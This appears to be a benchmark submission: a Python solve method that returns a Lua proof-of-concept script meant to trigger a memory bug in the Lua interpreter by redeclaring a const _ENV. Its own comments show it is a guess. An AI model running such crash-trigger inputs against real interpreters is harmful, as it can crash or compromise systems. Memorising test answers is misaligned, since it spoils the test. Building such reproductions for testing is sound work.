class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""local _ENV <const> = _ENV

local function foo()
    local x <const> = 42
    return x
end

print(foo())

-- Additional code to potentially trigger memory issues
for i = 1, 1000 do
    local t = {}
    for j = 1, 100 do
        t[j] = i * j
    end
    _ENV[i] = t
end

local _ENV <const> = nil  -- Attempt to redeclare or something to trigger

print("Done")"""
        return poc
